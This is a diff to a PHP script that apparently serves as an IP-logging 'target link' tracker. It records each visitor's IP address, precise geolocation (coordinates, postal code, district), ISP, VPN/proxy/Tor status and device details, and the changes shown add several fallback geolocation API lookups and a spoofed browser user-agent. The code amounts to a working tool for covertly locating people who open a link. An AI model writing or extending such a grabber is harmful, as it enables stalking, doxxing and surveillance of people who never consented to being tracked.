@@ -55,11 +55,18 @@ $log_entry = "╔" . str_repeat("═", 78) . "╗\n";
 $log_entry .= "║ [" . $timestamp . "] TARGET LINK OPENED\n";
 $log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
 $log_entry .= "║ IP ADDRESS: " . trim($ipaddress) . "\n";
-$log_entry .= "║ GEOLOCATION: " . $geo_info['country'] . " | " . $geo_info['city'] . " | " . $geo_info['postal_code'] . "\n";
+$log_entry .= "║ COUNTRY: " . $geo_info['country'] . " (" . $geo_info['country_code'] . ")\n";
+$log_entry .= "║ STATE/REGION: " . $geo_info['state'] . " | " . $geo_info['region'] . "\n";
+$log_entry .= "║ CITY: " . $geo_info['city'] . " | Postal: " . $geo_info['postal_code'] . "\n";
 $log_entry .= "║ COORDINATES: Lat " . $geo_info['latitude'] . " | Lon " . $geo_info['longitude'] . "\n";
-$log_entry .= "║ ISP/PROVIDER: " . $geo_info['isp'] . "\n";
-$log_entry .= "║ ORGANIZATION: " . $geo_info['organization'] . "\n";
-$log_entry .= "║ AS NUMBER: " . $geo_info['as_name'] . "\n";
+$log_entry .= "║ TIMEZONE: " . $geo_info['timezone'] . "\n";
+$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
+$log_entry .= "║ NETWORK INFO:\n";
+$log_entry .= "║   ISP: " . $geo_info['isp'] . "\n";
+$log_entry .= "║   ASN: " . $geo_info['as_name'] . "\n";
+$log_entry .= "║   ORGANIZATION: " . $geo_info['organization'] . "\n";
+$log_entry .= "║   VPN: " . $geo_info['vpn'] . " | PROXY: " . $geo_info['proxy'] . " | MOBILE: " . $geo_info['mobile'] . "\n";
+$log_entry .= "║   HOSTING: " . $geo_info['hosting'] . " | TOR: " . $geo_info['tor'] . "\n";
 $log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
 $log_entry .= "║ DEVICE INFO:\n";
 $log_entry .= "║   OS: " . $device_info['os'] . "\n";
@@ -71,7 +78,7 @@ $log_entry .= "║ CONNECTION INFO:\n";
 $log_entry .= "║   LANGUAGE: " . $accept_language . "\n";
 $log_entry .= "║   ENCODING: " . $accept_encoding . "\n";
 $log_entry .= "║   REFERER: " . $referer . "\n";
-$log_entry .= "║   TIMEZONE: " . date('T') . " (UTC" . date('O') . ")\n";
+$log_entry .= "║   SERVER TIME: " . $timestamp . " (" . date('T') . ")\n";
 $log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
 $log_entry .= "║ FULL USER-AGENT: " . $browser . "\n";
 $log_entry .= "╚" . str_repeat("═", 78) . "╝\n\n";
@@ -92,15 +99,26 @@ $json_entry = [
     'ip' => trim($ipaddress),
     'geolocation' => [
         'country' => $geo_info['country'],
+        'country_code' => $geo_info['country_code'],
+        'region' => $geo_info['region'],
+        'state' => $geo_info['state'],
         'city' => $geo_info['city'],
         'postal_code' => $geo_info['postal_code'],
-        'isp' => $geo_info['isp'],
-        'as_name' => $geo_info['as_name'],
-        'organization' => $geo_info['organization'],
+        'district' => $geo_info['district'],
         'latitude' => $geo_info['latitude'],
         'longitude' => $geo_info['longitude'],
-        'timezone' => date('T'),
-        'timezone_offset' => date('O')
+        'timezone' => $geo_info['timezone']
+    ],
+    'network' => [
+        'isp' => $geo_info['isp'],
+        'as_name' => $geo_info['as_name'],
+        'asn' => $geo_info['asn'],
+        'organization' => $geo_info['organization'],
+        'mobile' => $geo_info['mobile'],
+        'vpn' => $geo_info['vpn'],
+        'proxy' => $geo_info['proxy'],
+        'hosting' => $geo_info['hosting'],
+        'tor' => $geo_info['tor']
     ],
     'device' => [
         'os' => $device_info['os'],
@@ -180,20 +198,32 @@ function parse_user_agent($ua) {
     return $result;
 }
 
-// Helper function to get IP geolocation
+// Helper function to get IP geolocation with multiple fallback APIs
 function get_ip_geolocation($ip) {
+    // Default result structure
     $result = [
         'country' => 'Unknown',
+        'country_code' => 'Unknown',
+        'region' => 'Unknown',
+        'state' => 'Unknown',
         'city' => 'Unknown',
         'postal_code' => 'Unknown',
+        'district' => 'Unknown',
         'isp' => 'Unknown',
         'as_name' => 'Unknown',
+        'asn' => 'Unknown',
         'organization' => 'Unknown',
         'latitude' => 'N/A',
-        'longitude' => 'N/A'
+        'longitude' => 'N/A',
+        'timezone' => 'Unknown',
+        'vpn' => 'No',
+        'proxy' => 'No',
+        'tor' => 'No',
+        'hosting' => 'No',
+        'mobile' => 'No'
     ];
     
-    // Try to get geolocation from free API
+    // Try to get geolocation from free APIs
     $cache_file = 'geo_cache_' . md5($ip) . '.json';
     
     if (file_exists($cache_file)) {
@@ -203,62 +233,37 @@ function get_ip_geolocation($ip) {
         }
     }
     
-    // Try multiple free geolocation APIs
-    $apis = [
-        'https://ipapi.co/' . $ip . '/json/',
-        'https://ip-api.com/json/' . $ip . '?fields=country,city,postal,isp,as,org,lat,lon',
-        'https://ipwho.is/' . $ip
-    ];
+    // Multiple geolocation APIs with fallbacks
+    $api_results = [];
     
-    foreach ($apis as $api) {
-        $context = stream_context_create([
-            'http' => [
-                'timeout' => 3,
-                'user_agent' => 'Mozilla/5.0'
-            ]
-        ]);
+    // API 1: ip-api.com (most detailed, no rate limit for non-commercial)
+    $api_results[] = fetch_ip_api_com($ip);
+    
+    // API 2: ipwho.is (good fallback)
+    $api_results[] = fetch_ipwho_is($ip);
+    
+    // API 3: ipapi.co (rate limited but good data)
+    $api_results[] = fetch_ipapi_co($ip);
+    
+    // Merge results - use first successful API for each field
+    foreach ($api_results as $api_data) {
+        if (empty($api_data)) continue;
         
-        $response = @file_get_contents($api, false, $context);
-        if ($response) {
-            $data = json_decode($response, true);
-            
-            if ($data) {
-                // Parse different API response formats
-                if (isset($data['country_name'])) {
-                    // ipapi.co format
-                    $result['country'] = $data['country_name'] ?? $data['country'] ?? 'Unknown';
-                    $result['city'] = $data['city'] ?? 'Unknown';
-                    $result['postal_code'] = $data['postal'] ?? $data['postal_code'] ?? 'Unknown';
-                    $result['isp'] = $data['org'] ?? $data['isp'] ?? 'Unknown';
-                    $result['as_name'] = $data['asn'] ?? $data['as_name'] ?? 'Unknown';
-                    $result['organization'] = $data['org'] ?? $data['organization'] ?? 'Unknown';
-                    $result['latitude'] = $data['latitude'] ?? 'N/A';
-                    $result['longitude'] = $data['longitude'] ?? 'N/A';
-                    break;
-                } elseif (isset($data['country'])) {
-                    // ip-api.com format
-                    $result['country'] = $data['country'] ?? 'Unknown';
-                    $result['city'] = $data['city'] ?? 'Unknown';
-                    $result['postal_code'] = $data['postal'] ?? 'Unknown';
-                    $result['isp'] = $data['isp'] ?? 'Unknown';
-                    $result['as_name'] = $data['as'] ?? 'Unknown';
-                    $result['organization'] = $data['org'] ?? 'Unknown';
-                    $result['latitude'] = $data['lat'] ?? 'N/A';
-                    $result['longitude'] = $data['lon'] ?? 'N/A';
-                    break;
-                } elseif (isset($data['type']) && $data['type'] === 'IPv4') {
-                    // ipwho.is format (different structure)
-                    $result['country'] = $data['country'] ?? 'Unknown';
-                    $result['city'] = $data['city'] ?? 'Unknown';
-                    $result['postal_code'] = $data['postal'] ?? 'Unknown';
-                    $result['isp'] = $data['connection']['isp'] ?? 'Unknown';
-                    $result['as_name'] = 'AS' . ($data['connection']['asn'] ?? 'Unknown');
-                    $result['organization'] = $data['connection']['org'] ?? $data['connection']['organization'] ?? 'Unknown';
-                    $result['latitude'] = $data['latitude'] ?? 'N/A';
-                    $result['longitude'] = $data['longitude'] ?? 'N/A';
-                    break;
+        foreach ($result as $key => $value) {
+            if ($value === 'Unknown' || $value === 'N/A' || empty($value)) {
+                if (isset($api_data[$key]) && $api_data[$key] !== 'Unknown' && $api_data[$key] !== 'N/A' && !empty($api_data[$key])) {
+                    $result[$key] = $api_data[$key];
                 }
             }
+        }
+    }
+    
+    // If still unknown, try to at least get country from simple API
+    if ($result['country'] === 'Unknown') {
+        $simple = fetch_simple_country($ip);
+        if ($simple) {
+            $result['country'] = $simple['country'] ?? 'Unknown';
+            $result['country_code'] = $simple['country_code'] ?? 'Unknown';
         }
     }
     
@@ -270,6 +275,150 @@ function get_ip_geolocation($ip) {
     file_put_contents($cache_file, json_encode($cache_data));
     
     return $result;
+}
+
+// Fetch from ip-api.com
+function fetch_ip_api_com($ip) {
+    $api_url = 'http://ip-api.com/json/' . $ip . '?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,query';
+    
+    $context = stream_context_create([
+        'http' => [
+            'timeout' => 5,
+            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ]
+    ]);
+    
+    $response = @file_get_contents($api_url, false, $context);
+    if (!$response) return [];
+    
+    $data = json_decode($response, true);
+    if (!$data || $data['status'] !== 'success') return [];
+    
+    return [
+        'country' => $data['country'] ?? 'Unknown',
+        'country_code' => $data['countryCode'] ?? 'Unknown',
+        'region' => $data['regionName'] ?? $data['region'] ?? 'Unknown',
+        'state' => $data['regionName'] ?? $data['region'] ?? 'Unknown',
+        'city' => $data['city'] ?? 'Unknown',
+        'postal_code' => $data['zip'] ?? 'Unknown',
+        'district' => $data['district'] ?? 'Unknown',
+        'isp' => $data['isp'] ?? 'Unknown',
+        'as_name' => $data['as'] ?? $data['asname'] ?? 'Unknown',
+        'asn' => $data['as'] ?? 'Unknown',
+        'organization' => $data['org'] ?? 'Unknown',
+        'latitude' => $data['lat'] ?? 'N/A',
+        'longitude' => $data['lon'] ?? 'N/A',
+        'timezone' => $data['timezone'] ?? 'Unknown',
+        'mobile' => ($data['mobile'] ?? false) ? 'Yes' : 'No',
+        'proxy' => ($data['proxy'] ?? false) ? 'Yes' : 'No',
+        'hosting' => ($data['hosting'] ?? false) ? 'Yes' : 'No',
+        'vpn' => 'No',
+        'tor' => 'No'
+    ];
+}
+
+// Fetch from ipwho.is
+function fetch_ipwho_is($ip) {
+    $api_url = 'https://ipwho.is/' . $ip;
+    
+    $context = stream_context_create([
+        'http' => [
+            'timeout' => 5,
+            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ]
+    ]);
+    
+    $response = @file_get_contents($api_url, false, $context);
+    if (!$response) return [];
+    
+    $data = json_decode($response, true);
+    if (!$data || ($data['success'] ?? false) === false) return [];
+    
+    return [
+        'country' => $data['country'] ?? 'Unknown',
+        'country_code' => $data['country_code'] ?? 'Unknown',
+        'region' => $data['region'] ?? 'Unknown',
+        'state' => $data['region'] ?? 'Unknown',
+        'city' => $data['city'] ?? 'Unknown',
+        'postal_code' => $data['postal'] ?? 'Unknown',
+        'district' => 'Unknown',
+        'isp' => $data['connection']['isp'] ?? 'Unknown',
+        'as_name' => 'AS' . ($data['connection']['asn'] ?? 'Unknown'),
+        'asn' => $data['connection']['asn'] ?? 'Unknown',
+        'organization' => $data['connection']['org'] ?? 'Unknown',
+        'latitude' => $data['latitude'] ?? 'N/A',
+        'longitude' => $data['longitude'] ?? 'N/A',
+        'timezone' => $data['timezone']['id'] ?? 'Unknown',
+        'mobile' => 'No',
+        'proxy' => 'No',
+        'hosting' => 'No',
+        'vpn' => 'No',
+        'tor' => 'No'
+    ];
+}
+
+// Fetch from ipapi.co
+function fetch_ipapi_co($ip) {
+    $api_url = 'https://ipapi.co/' . $ip . '/json/';
+    
+    $context = stream_context_create([
+        'http' => [
+            'timeout' => 5,
+            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ]
+    ]);
+    
+    $response = @file_get_contents($api_url, false, $context);
+    if (!$response) return [];
+    
+    $data = json_decode($response, true);
+    if (!$data || isset($data['error'])) return [];
+    
+    return [
+        'country' => $data['country_name'] ?? $data['country'] ?? 'Unknown',
+        'country_code' => $data['country_code'] ?? 'Unknown',
+        'region' => $data['region'] ?? 'Unknown',
+        'state' => $data['region'] ?? 'Unknown',
+        'city' => $data['city'] ?? 'Unknown',
+        'postal_code' => $data['postal'] ?? 'Unknown',
+        'district' => 'Unknown',
+        'isp' => $data['org'] ?? $data['isp'] ?? 'Unknown',
+        'as_name' => $data['asn'] ?? 'Unknown',
+        'asn' => $data['asn'] ?? 'Unknown',
+        'organization' => $data['org'] ?? 'Unknown',
+        'latitude' => $data['latitude'] ?? 'N/A',
+        'longitude' => $data['longitude'] ?? 'N/A',
+        'timezone' => $data['timezone'] ?? 'Unknown',
+        'mobile' => 'No',
+        'proxy' => 'No',
+        'hosting' => 'No',
+        'vpn' => 'No',
+        'tor' => 'No'
+    ];
+}
+
+// Simple country fallback
+function fetch_simple_country($ip) {
+    // Try freegeoip.app as last resort
+    $api_url = 'https://freegeoip.app/json/' . $ip;
+    
+    $context = stream_context_create([
+        'http' => [
+            'timeout' => 3,
+            'user_agent' => 'Mozilla/5.0'
+        ]
+    ]);
+    
+    $response = @file_get_contents($api_url, false, $context);
+    if (!$response) return [];
+    
+    $data = json_decode($response, true);
+    if (!$data) return [];
+    
+    return [
+        'country' => $data['country_name'] ?? 'Unknown',
+        'country_code' => $data['country_code'] ?? 'Unknown'
+    ];
 }
 
 ?>
